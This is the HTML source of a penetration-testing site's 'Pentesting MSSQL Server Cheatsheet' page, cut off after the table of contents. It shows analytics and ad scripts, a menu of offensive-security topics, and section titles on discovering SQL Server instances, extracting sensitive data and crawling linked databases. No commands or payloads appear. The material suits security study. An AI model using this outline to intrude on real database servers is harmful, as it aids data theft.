<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Tips, tricks, techniques and methodologies for pentesting MSSQL Server">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="Pentesting MSSQL Server Cheatsheet" />
<meta property="og:description" content="Tips, tricks, techniques and methodologies for pentesting MSSQL Server" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/mssql_server_cheatsheet/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
<title>Pentesting MSSQL Server Cheatsheet | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce="v6fQG2hYHmw1rpUUC6mr9w"></script><script nonce="v6fQG2hYHmw1rpUUC6mr9w">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();</script>
<script>(function(){

'use strict';var aa=function(a){var b=0;return function(){return b<a.length?{done:!1,value:a[b++]}:{done:!0}}},ba="function"==typeof Object.create?Object.create:function(a){var b=function(){};b.prototype=a;return new b},k;if("function"==typeof Object.setPrototypeOf)k=Object.setPrototypeOf;else{var m;a:{var ca={a:!0},n={};try{n.__proto__=ca;m=n.a;break a}catch(a){}m=!1}k=m?function(a,b){a.__proto__=b;if(a.__proto__!==b)throw new TypeError(a+" is not extensible");return a}:null}
var p=k,q=function(a,b){a.prototype=ba(b.prototype);a.prototype.constructor=a;if(p)p(a,b);else for(var c in b)if("prototype"!=c)if(Object.defineProperties){var d=Object.getOwnPropertyDescriptor(b,c);d&&Object.defineProperty(a,c,d)}else a[c]=b[c];a.v=b.prototype},r=this||self,da=function(){},t=function(a){return a};var u;var w=function(a,b){this.g=b===v?a:""};w.prototype.toString=function(){return this.g+""};var v={},x=function(a){if(void 0===u){var b=null;var c=r.trustedTypes;if(c&&c.createPolicy){try{b=c.createPolicy("goog#html",{createHTML:t,createScript:t,createScriptURL:t})}catch(d){r.console&&r.console.error(d.message)}u=b}else u=b}a=(b=u)?b.createScriptURL(a):a;return new w(a,v)};var A=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)};var B={},C=null;var D="function"===typeof Uint8Array;function E(a,b,c){return"object"===typeof a?D&&!Array.isArray(a)&&a instanceof Uint8Array?c(a):F(a,b,c):b(a)}function F(a,b,c){if(Array.isArray(a)){for(var d=Array(a.length),e=0;e<a.length;e++){var f=a[e];null!=f&&(d[e]=E(f,b,c))}Array.isArray(a)&&a.s&&G(d);return d}d={};for(e in a)Object.prototype.hasOwnProperty.call(a,e)&&(f=a[e],null!=f&&(d[e]=E(f,b,c)));return d}
function ea(a){return F(a,function(b){return"number"===typeof b?isFinite(b)?b:String(b):b},function(b){var c;void 0===c&&(c=0);if(!C){C={};for(var d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),e=["+/=","+/","-_=","-_.","-_"],f=0;5>f;f++){var h=d.concat(e[f].split(""));B[f]=h;for(var g=0;g<h.length;g++){var l=h[g];void 0===C[l]&&(C[l]=g)}}}c=B[c];d=Array(Math.floor(b.length/3));e=c[64]||"";for(f=h=0;h<b.length-2;h+=3){var y=b[h],z=b[h+1];l=b[h+2];g=c[y>>2];y=c[(y&3)<<
4|z>>4];z=c[(z&15)<<2|l>>6];l=c[l&63];d[f++]=""+g+y+z+l}g=0;l=e;switch(b.length-h){case 2:g=b[h+1],l=c[(g&15)<<2]||e;case 1:b=b[h],d[f]=""+c[b>>2]+c[(b&3)<<4|g>>4]+l+e}return d.join("")})}var fa={s:{value:!0,configurable:!0}},G=function(a){Array.isArray(a)&&!Object.isFrozen(a)&&Object.defineProperties(a,fa);return a};var H;var J=function(a,b,c){var d=H;H=null;a||(a=d);d=this.constructor.u;a||(a=d?[d]:[]);this.j=d?0:-1;this.h=null;this.g=a;a:{d=this.g.length;a=d-1;if(d&&(d=this.g[a],!(null===d||"object"!=typeof d||Array.isArray(d)||D&&d instanceof Uint8Array))){this.l=a-this.j;this.i=d;break a}void 0!==b&&-1<b?(this.l=Math.max(b,a+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(c)for(b=0;b<c.length;b++)a=c[b],a<this.l?(a+=this.j,(d=this.g[a])?G(d):this.g[a]=I):(d=this.l+this.j,this.g[d]||(this.i=this.g[d]={}),(d=this.i[a])?
G(d):this.i[a]=I)},I=Object.freeze(G([])),K=function(a,b){if(-1===b)return null;if(b<a.l){b+=a.j;var c=a.g[b];return c!==I?c:a.g[b]=G([])}if(a.i)return c=a.i[b],c!==I?c:a.i[b]=G([])},M=function(a,b){var c=L;if(-1===b)return null;a.h||(a.h={});if(!a.h[b]){var d=K(a,b);d&&(a.h[b]=new c(d))}return a.h[b]};J.prototype.toJSON=function(){var a=N(this,!1);return ea(a)};
var N=function(a,b){if(a.h)for(var c in a.h)if(Object.prototype.hasOwnProperty.call(a.h,c)){var d=a.h[c];if(Array.isArray(d))for(var e=0;e<d.length;e++)d[e]&&N(d[e],b);else d&&N(d,b)}return a.g},O=function(a,b){H=b=b?JSON.parse(b):null;a=new a(b);H=null;return a};J.prototype.toString=function(){return N(this,!1).toString()};var P=function(a){J.call(this,a)};q(P,J);function ha(a){var b,c=(a.ownerDocument&&a.ownerDocument.defaultView||window).document,d=null===(b=c.querySelector)||void 0===b?void 0:b.call(c,"script[nonce]");(b=d?d.nonce||d.getAttribute("nonce")||"":"")&&a.setAttribute("nonce",b)};var Q=function(a,b){b=String(b);"application/xhtml+xml"===a.contentType&&(b=b.toLowerCase());return a.createElement(b)},R=function(a){this.g=a||r.document||document};R.prototype.appendChild=function(a,b){a.appendChild(b)};var S=function(a,b,c,d,e,f){try{var h=a.g,g=Q(a.g,"SCRIPT");g.async=!0;g.src=b instanceof w&&b.constructor===w?b.g:"type_error:TrustedResourceUrl";ha(g);h.head.appendChild(g);g.addEventListener("load",function(){e();d&&h.head.removeChild(g)});g.addEventListener("error",function(){0<c?S(a,b,c-1,d,e,f):(d&&h.head.removeChild(g),f())})}catch(l){f()}};var ia=r.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),ja=r.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),ka=r.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),la=function(a,b,c){this.h=a;this.j=new R(this.h);this.g=null;this.i=[];this.l=!1;this.o=b;this.m=c},V=function(a){if(a.h.body&&!a.l){var b=
function(){T(a);r.setTimeout(function(){return U(a,3)},50)};S(a.j,a.o,2,!0,function(){r[a.m]||b()},b);a.l=!0}},T=function(a){for(var b=W(1,5),c=0;c<b;c++){var d=X(a);a.h.body.appendChild(d);a.i.push(d)}b=X(a);b.style.bottom="0";b.style.left="0";b.style.position="fixed";b.style.width=W(100,110).toString()+"%";b.style.zIndex=W(2147483544,2147483644).toString();b.style["background-color"]=ma(249,259,242,252,219,229);b.style["box-shadow"]="0 0 12px #888";b.style.color=ma(0,10,0,10,0,10);b.style.display=
"flex";b.style["justify-content"]="center";b.style["font-family"]="Roboto, Arial";c=X(a);c.style.width=W(80,85).toString()+"%";c.style.maxWidth=W(750,775).toString()+"px";c.style.margin="24px";c.style.display="flex";c.style["align-items"]="flex-start";c.style["justify-content"]="center";d=Q(a.j.g,"IMG");d.className=A();d.src=ia;d.style.height="24px";d.style.width="24px";d.style["padding-right"]="16px";var e=X(a),f=X(a);f.style["font-weight"]="bold";f.textContent=ja;var h=X(a);h.textContent=ka;Y(a,
e,f);Y(a,e,h);Y(a,c,d);Y(a,c,e);Y(a,b,c);a.g=b;a.h.body.appendChild(a.g);b=W(1,5);for(c=0;c<b;c++)d=X(a),a.h.body.appendChild(d),a.i.push(d)},Y=function(a,b,c){for(var d=W(1,5),e=0;e<d;e++){var f=X(a);b.appendChild(f)}b.appendChild(c);c=W(1,5);for(d=0;d<c;d++)e=X(a),b.appendChild(e)},W=function(a,b){return Math.floor(a+Math.random()*(b-a))},ma=function(a,b,c,d,e,f){return"rgb("+W(Math.max(a,0),Math.min(b,255)).toString()+","+W(Math.max(c,0),Math.min(d,255)).toString()+","+W(Math.max(e,0),Math.min(f,
255)).toString()+")"},X=function(a){a=Q(a.j.g,"DIV");a.className=A();return a},U=function(a,b){0>=b||null!=a.g&&0!=a.g.offsetHeight&&0!=a.g.offsetWidth||(na(a),T(a),r.setTimeout(function(){return U(a,b-1)},50))},na=function(a){var b=a.i;var c="undefined"!=typeof Symbol&&Symbol.iterator&&b[Symbol.iterator];b=c?c.call(b):{next:aa(b)};for(c=b.next();!c.done;c=b.next())(c=c.value)&&c.parentNode&&c.parentNode.removeChild(c);a.i=[];(b=a.g)&&b.parentNode&&b.parentNode.removeChild(b);a.g=null};var pa=function(a,b,c,d,e){var f=oa(c),h=function(l){l.appendChild(f);r.setTimeout(function(){f?(0!==f.offsetHeight&&0!==f.offsetWidth?b():a(),f.parentNode&&f.parentNode.removeChild(f)):a()},d)},g=function(l){document.body?h(document.body):0<l?r.setTimeout(function(){g(l-1)},e):b()};g(3)},oa=function(a){var b=document.createElement("div");b.className=a;b.style.width="1px";b.style.height="1px";b.style.position="absolute";b.style.left="-10000px";b.style.top="-10000px";b.style.zIndex="-10000";return b};var L=function(a){J.call(this,a)};q(L,J);var qa=function(a){J.call(this,a)};q(qa,J);var ra=function(a,b){this.l=a;this.m=new R(a.document);this.g=b;this.i=K(this.g,1);b=M(this.g,2);this.o=x(K(b,4)||"");this.h=!1;b=M(this.g,13);b=x(K(b,4)||"");this.j=new la(a.document,b,K(this.g,12))};ra.prototype.start=function(){sa(this)};
var sa=function(a){ta(a);S(a.m,a.o,3,!1,function(){a:{var b=a.i;var c=r.btoa(b);if(c=r[c]){try{var d=O(P,r.atob(c))}catch(e){b=!1;break a}b=b===K(d,1)}else b=!1}b?Z(a,K(a.g,14)):(Z(a,K(a.g,8)),V(a.j))},function(){pa(function(){Z(a,K(a.g,7));V(a.j)},function(){return Z(a,K(a.g,6))},K(a.g,9),K(a.g,10),K(a.g,11))})},Z=function(a,b){a.h||(a.h=!0,a=new a.l.XMLHttpRequest,a.open("GET",b,!0),a.send())},ta=function(a){var b=r.btoa(a.i);a.l[b]&&Z(a,K(a.g,5))};(function(a,b){r[a]=function(c){for(var d=[],e=0;e<arguments.length;++e)d[e-0]=arguments[e];r[a]=da;b.apply(null,d)}})("__h82AlnkH6D91__",function(a){"function"===typeof window.atob&&(new ra(window,O(qa,window.atob(a)))).start()});}).call(this);

window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hVTV9oOG1BMHF6c2xHRlBZR0xrS2g0UHRVX21ERkZSWVBjcTFBZU1aN0diVW5xSGRzNlR5OUZTYWlsM0thZ28tb19BU3hqbjRyZFdLOGhzVUlHbmFqalZRXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZScnBMVGFzQ1JjSDBxSkpfSVhRWmd1YXQxZ292Ty01YlN0WUJXNGJUTThTNjlTdUU0WkVQVnZKZ0E2WC1UY1VNTlRLbXc3V1hLU2NoY1pJaHFOTVJ2UmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFUxMG44RWlxNnBhUEw5Q1lOcjBZcG1xdTVuZzVzTkR3Zm5yN1pSRVExWEt5UlBLMFJxS1RST2Y0Q3B5S0pIUFpVem83MldIU3VrbWlKb1p4c2Y2RzJwLWdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFZDb2RlRVZCbFQxdXA5MUMzZ0V0dVFROVVxbVBSVGwwS2Qyc1FqcF9GWHV3WGxFYUhVekNvSWIxUzJtQnZ4T3Q5eHJra19vNWRXbWFfYl83dl9JRlVpeHdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VjRnWnE1WHlLaXVNS3lHdUU1Y2ZISDdoNWUtb0VVZktOekNTWEgzYmN2U285OTNYLTFuc0VkU19SZjRjUTNYZjZJSEdyaGFIb1FNc1hqMFhZUGcwMFU5d1x1MDAzZFx1MDAzZCJd");</script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/argument_injection/" class="">Argument Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/python/" class="">Python Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/ruby/" class="">Ruby Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/yaml/" class="">YAML Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/dotnet/" class="">.NET Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/node/" class="">Node Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/php/" class="">PHP Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/java/" class="">Insecure Deserialization - Java</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="active">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Pentesting MSSQL Server Cheatsheet</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#mssql-server">MSSQL Server</a>
      <ul>
        <li><a href="#identify-instances-and-databases">Identify Instances and Databases</a>
          <ul>
            <li><a href="#discover-local-sql-server-instances">Discover Local SQL Server Instances</a></li>
            <li><a href="#discover-domain-sql-server-instances">Discover Domain SQL Server Instances</a></li>
            <li><a href="#discover-remote-sql-server-instances">Discover Remote SQL Server Instances</a></li>
            <li><a href="#identify-encrypted-databases">Identify Encrypted databases</a></li>
            <li><a href="#version-query">Version Query</a></li>
          </ul>
        </li>
        <li><a href="#identify-sensitive-information">Identify Sensitive Information</a>
          <ul>
            <li><a href="#get-tables-from-a-specific-database">Get Tables from a Specific Database</a></li>
            <li><a href="#gather-5-entries-from-each-column">Gather 5 Entries from Each Column</a></li>
            <li><a href="#gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</a></li>
            <li><a href="#dump-common-information-from-server-to-files">Dump common information from server to files</a></li>
          </ul>
        </li>
        <li><a href="#linked-database">Linked Database</a>
          <ul>
            <li><a href="#find-trusted-link">Find Trusted Link</a></li>
            <li><a href="#execute-query-through-the-link">Execute Query Through The Link</a></li>
            <li><a href="#crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</a></li>
            <li><a href="#crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</a></li>
            <li><a href="#query-version-of-linked-database">Query Version of Linked Database</a></li>
            <li><a href="#execute-procedure-on-linked-database">Execute Procedure on Linked Database</a></li>
            <li><a href="#determine-names-of-linked-databases">Determine Names of Linked Databases</a></li>
            <li><a href="#determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</a></li>
            <li><a href="#gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</a></li>
            <li><a href="#gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</a></li>
          </ul>
        </li>
